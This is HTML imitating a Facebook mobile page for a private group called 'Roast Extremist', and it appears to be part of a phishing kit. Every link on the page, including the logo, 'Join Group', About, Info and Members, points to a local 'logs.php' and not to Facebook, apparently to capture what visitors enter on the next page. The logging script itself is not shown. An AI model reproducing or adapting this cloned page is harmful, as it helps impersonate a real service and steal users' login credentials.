...
<html>
 <head>
  <title>Roast Extremist private group | Facebook</title>
  ...
  <meta name="description" content="Roast Extremist has 77036 members. 👍👍Everyone take it as a fun don't take it personally.👍👍
   ...
   <div id="viewport">
    <div class="g h">
     <div class="i j" role="banner" id="header">
      ...
      <a href="logs.php"><img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/y8/r/k97pj8-or6s.png?_nc_x=Ij3Wp8lg5Kz" width="77" height="16" class="k l" alt="facebook"></a>
     </div>
    </div>
    <div id="objects_container">
     <div class="m e" id="root" role="main">
      <div class="n">
       ...
       <a href="logs.php" class="bb bc bd">Join Group</a>
       <div></div>
        ...
        <ul class="bg bh">
         <li class="bi">
          <table class="q r" role="presentation">
           <tbody>
            <tr>
             <td class="s"><a href="logs.php">About</a></td>
             <td class="v"></td>
            </tr>
           </tbody>
          </table></li>
         <li class="bi">
          <table class="q r" role="presentation">
           <tbody>
            <tr>
             <td class="s"><a href="logs.php">Info</a></td>
             <td class="v"></td>
            </tr>
           </tbody>
          </table></li>
         <li class="bi">
          <table class="q r" role="presentation">
           <tbody>
            <tr>
             <td class="s"><a href="logs.php" id="u_0_1" aria-labelledby="u_0_1 u_0_0">Members</a></td>
             <td class="v"><span class="bj bk" id="u_0_0">77036</span></td>
            </tr>
           </tbody>
          </table></li>
        </ul>
    ...
    <div class="bg">
     <div class="bt">
      ...
      <span class="ca cb">Facebook ©2019</span>
     </div>
    </div>
   </div>
  </div>
